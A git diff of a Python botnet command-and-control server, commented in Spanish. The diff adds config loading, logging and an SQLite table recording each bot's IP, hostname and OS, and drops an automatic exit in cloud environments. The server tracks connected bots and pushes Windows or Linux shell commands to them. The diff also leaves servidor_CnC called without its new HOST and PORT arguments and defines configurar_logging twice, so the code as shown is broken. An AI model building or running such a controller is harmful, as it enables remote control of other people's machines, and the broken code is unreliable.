@@ -1,23 +1,116 @@
+import logging
 import socket
+import sys
 import threading
 import time
 import os
 import ipaddress
 import requests
+import sqlite3
+import configparser
 
-HOST = "172.31.128.167" # IP del servidor
-PORT = 9999 # Puerto que escucha
 bots = [] # List de bots
 bot_ids = {} # Diccinario con los IDS de los bots
 sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot
 respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots
 
+def configurar_logging():
+    
+    """
+    Configura el sistema de logging del servidor.
+
+    Lee la configuración desde el archivo `config/config.ini` y configura
+    el sistema de logging según los valores especificados en la sección
+    `LOGGING`.
+
+    Los valores que se pueden especificar son:
+        * `LOG_LEVEL`: Nivel de log (DEBUG, INFO, WARNING, ERROR, CRITICAL)
+        * `LOG_FILE`: Ruta del archivo de log
+
+    Si no se especifica un valor, se usan los valores predeterminados:
+        * `LOG_LEVEL`: INFO
+        * `LOG_FILE`: `logs/server.log`
+
+    :return: None
+    """
+    config = configparser.ConfigParser()
+    config.read('config/config.ini')
+
+    # Obtener valores de configuración
+    log_level = config.get('LOGGING', 'LOG_LEVEL', fallback='INFO').upper()
+    log_file = config.get('LOGGING', 'LOG_FILE', fallback='logs/server.log')
+
+    # Convertir a nivel de logging válido
+    log_levels = {
+        "DEBUG": logging.DEBUG,
+        "INFO": logging.INFO,
+        "WARNING": logging.WARNING,
+        "ERROR": logging.ERROR,
+        "CRITICAL": logging.CRITICAL
+    }
+    log_level = log_levels.get(log_level, logging.INFO)
+
+    # Crear directorio de logs si no existe
+    os.makedirs(os.path.dirname(log_file), exist_ok=True)
+
+    # Configurar logging
+    logging.basicConfig(
+        level=log_level,
+        format="%(asctime)s - %(levelname)s - %(message)s",
+        handlers=[
+            logging.FileHandler(log_file),
+            logging.StreamHandler()
+        ]
+    )
+
+    logging.info("Sistema de logging configurado correctamente.")
+
+# Inicializar la base de datos
+def init_db(DB_PATH):
+    
+    """
+    Inicializa la base de datos SQLite para almacenar información sobre los bots.
+
+    Crea la carpeta y el archivo de la base de datos si no existe,
+    y crea la tabla "bots" si no existe.
+
+    :param DB_PATH: La ruta del archivo de la base de datos.
+    :type DB_PATH: str
+    """
+    
+    db_dir = os.path.dirname(DB_PATH)
+    if not os.path.exists(db_dir):
+        os.makedirs(db_dir)  # Crear carpeta si no existe
+
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+
+    cursor.execute('''CREATE TABLE IF NOT EXISTS bots (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        ip TEXT UNIQUE,
+                        hostname TEXT,
+                        os TEXT,
+                        last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                    )''')
+
+    conn.commit()
+    conn.close()
 
 def detectarEntornoCloud():
+    
     """
-    Verifica si el programa se ejecuta en un entorno de cloud computing.
-    Si es así, el programa se cierra automáticamente.
+    Detecta si el entorno actual es un entorno de cloud computing.
+
+    Intenta conectarse a los puntos de metadata de AWS y Google Cloud para 
+    determinar si el código se ejecuta en un entorno de nube. Si se logra 
+    conectar exitosamente a cualquiera de estos servicios, se asume que el 
+    entorno es un entorno de cloud y se devuelve True. En caso contrario, 
+    se devuelve False.
+
+    Returns:
+        bool: True si se ejecuta en un entorno de cloud, False en caso contrario.
     """
+
     try:
         # AWS Metadata
         if requests.get("http://169.254.169.254/latest/meta-data/", timeout=1).status_code == 200:
@@ -34,11 +127,6 @@ def detectarEntornoCloud():
 
     return False
 
-# Verificar si estamos en un entorno cloud
-if detectarEntornoCloud():
-    print("[ERROR] No puedes ejecutar este programa en un servidor cloud.")
-    exit()
-    
 def esRedPrivada(ip):
     """Indica si una IP es de una red privada o no.
 
@@ -110,9 +198,18 @@ def verificar_eula(tipo):
         exit()
 
 def manejar_bot(conn, addr, bot_id):
+    
     """
-    Maneja la conexión con un bot, recibiendo sus respuestas y almacenándolas.
+    Maneja una conexión de bot y la agrega a la lista de bots.
+
+    :param conn: El socket del bot conectado.
+    :type conn: socket.socket
+    :param addr: La dirección IP y puerto del bot.
+    :type addr: tuple
+    :param bot_id: El ID del bot, que se usará para identificarlo.
+    :type bot_id: int
     """
+    
     print(f"Bot {bot_id} conectado desde {addr}")
 
     # Detectar sistema operativo
@@ -150,8 +247,7 @@ def manejar_bot(conn, addr, bot_id):
         del sistemas_operativos[conn]
     print(f"Bot {bot_id} desconectado")
 
-
-def servidor_CnC():
+def servidor_CnC(HOST, PORT):
 
     """
     Inicia el servidor de Comando y Control (CnC). Crea un socket, lo asocia
@@ -351,9 +447,17 @@ def menu_comandos():
     enviar_comando(comando_windows, comando_linux)
 
 def enviar_comando(comando_windows, comando_linux):
+    
+
     """
-    Selecciona bots para enviar comandos y espera todas las respuestas antes de mostrar el menú de nuevo.
+    Envía un comando a un conjunto de bots seleccionados.
+
+    :param comando_windows: El comando a enviar a los bots Windows.
+    :type comando_windows: str
+    :param comando_linux: El comando a enviar a los bots Linux.
+    :type comando_linux: str
     """
+    
     if not bots:
         print("No hay bots conectados.")
         return
@@ -416,9 +520,22 @@ def enviar_comando(comando_windows, comando_linux):
     time.sleep(2)
 
 def enviar_comando_a_bot(bot, comando_windows, comando_linux):
+    
     """
-    Envía un comando a un bot específico y espera su respuesta hasta que `manejar_bot()` la almacene.
+    Envía un comando a un bot específico basado en su sistema operativo.
+
+    Determina el sistema operativo del bot y envía el comando adecuado 
+    para Windows o Linux. Espera una respuesta del bot por un tiempo 
+    máximo definido y devuelve la respuesta si se recibe. Maneja la 
+    desconexión del bot si ocurre durante la comunicación.
+
+    :param bot: El socket del bot al que se enviará el comando.
+    :param comando_windows: El comando a ejecutar si el bot es Windows.
+    :param comando_linux: El comando a ejecutar si el bot es Linux.
+    :return: La respuesta del bot o un mensaje de error si no se recibe 
+             respuesta o si el bot se desconecta.
     """
+
     so = sistemas_operativos.get(bot, "desconocido")
     comando = comando_windows if so == "windows" else comando_linux
     bot_id = bot_ids.get(bot, "Desconocido")
@@ -497,9 +614,119 @@ def cerrar_conexion_bots():
 
     print(f"Bot {bot_id} eliminado correctamente del sistema.")
 
-if __name__ == "__main__":
-    verificar_eula("servidor")
-    if not esRedPrivada(HOST):
+def cargar_configuracion():
+    
+    """
+    Carga la configuración del servidor desde un archivo "config.ini" ubicado
+    en el directorio "config" del proyecto.
+
+    La configuración se almacena en un objeto con las siguientes claves:
+        * BASE_DIR: Directorio base del proyecto.
+        * HOST: Dirección IP del servidor.
+        * PORT: Puerto de escucha del servidor.
+        * MAX_CONNECTIONS: Número máximo de conexiones permitidas.
+        * DB_PATH: Ruta del archivo de la base de datos.
+        * SECRET_KEY: Clave secreta para la autenticación.
+        * HASH_ALGORITHM: Algoritmo de hash para la autenticación.
+        * LOG_LEVEL: Nivel de log (DEBUG, INFO, WARNING, ERROR, CRITICAL).
+        * LOG_FILE: Ruta del archivo de log.
+
+    Si no se encuentra el archivo de configuración o hay un error al leerlo,
+    se muestra un mensaje de error y se sale del programa con un estado de
+    error.
+
+    :return: Un objeto con la configuración cargada.
+    """
+    try:
+        BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+        CONFIG_DIR = os.path.join(BASE_DIR, "..", "config")
+        CONFIG_PATH = os.path.join(CONFIG_DIR, "config.ini")
+
+        if not os.path.exists(CONFIG_PATH):
+            raise FileNotFoundError(f"[ERROR] No se encontró el archivo de configuración: {CONFIG_PATH}")
+
+        config = configparser.ConfigParser()
+        config.read(CONFIG_PATH)
+
+        return {
+            "BASE_DIR": BASE_DIR,
+            "HOST": config.get("NETWORK", "HOST"),
+            "PORT": config.getint("NETWORK", "PORT"),
+            "MAX_CONNECTIONS": config.getint("NETWORK", "MAX_CONNECTIONS"),
+            "DB_PATH": os.path.join(BASE_DIR, config.get("DATABASE", "DB_PATH")),
+            "SECRET_KEY": config.get("SECURITY", "SECRET_KEY"),
+            "HASH_ALGORITHM": config.get("SECURITY", "HASH_ALGORITHM"),
+            "LOG_LEVEL": config.get("LOGGING", "LOG_LEVEL"),
+            "LOG_FILE": os.path.join(BASE_DIR, config.get("LOGGING", "LOG_FILE"))
+        }
+    except Exception as e:
+        print(f"[ERROR] Error al cargar la configuración: {e}")
+        exit(1)
+
+def configurar_logging(config):
+    
+    """
+    Configura el sistema de logging del servidor.
+
+    El nivel de log se establece según la clave "LOG_LEVEL" en el objeto de configuración.
+    El nivel de log puede ser "DEBUG", "INFO", "WARNING", "ERROR" o "CRITICAL".
+    Si no se especifica un nivel de log, se establece en "INFO" por defecto.
+
+    La ruta del archivo de log se establece según la clave "LOG_FILE" en el objeto de configuración.
+    La ruta se crea si no existe.
+
+    El formato de los mensajes de log se establece en "%(asctime)s - %(levelname)s - %(message)s".
+
+    Los mensajes de log se escriben en el archivo de log y en la consola.
+
+    :param config: Un objeto con la configuración del servidor.
+    """
+    
+    log_level = config["LOG_LEVEL"].upper()
+    log_file = config["LOG_FILE"]
+
+    log_levels = {
+        "DEBUG": logging.DEBUG,
+        "INFO": logging.INFO,
+        "WARNING": logging.WARNING,
+        "ERROR": logging.ERROR,
+        "CRITICAL": logging.CRITICAL
+    }
+    log_level = log_levels.get(log_level, logging.INFO)
+
+    os.makedirs(os.path.dirname(log_file), exist_ok=True)
+
+    logging.basicConfig(
+        level=log_level,
+        format="%(asctime)s - %(levelname)s - %(message)s",
+        handlers=[
+            logging.FileHandler(log_file),
+            logging.StreamHandler()
+        ]
+    )
+
+    logging.info("Sistema de logging configurado correctamente.")
+
+def iniciar_servidor():
+    
+    """
+    Inicializa el servidor de Comando y Control (C2) verificando primero
+    que no se ejecute en una red privada y mostrando un aviso de EULA.
+
+    Luego, inicializa la base de datos, configura el sistema de logging y
+    lanza el servidor de C2.
+
+    :return: None
+    """
+    
+    config = cargar_configuracion()
+    if not esRedPrivada(config["HOST"]):
         input("[ERROR] No puedes ejecutar este servidor fuera de una red privada. Presione ENTER para cerrar.")
-        exit()
+        sys.exit(1)
+    verificar_eula("servidor")
+    init_db(config["DB_PATH"])
+    configurar_logging(config)
     servidor_CnC()
+
+if __name__ == "__main__":
+    iniciar_servidor()
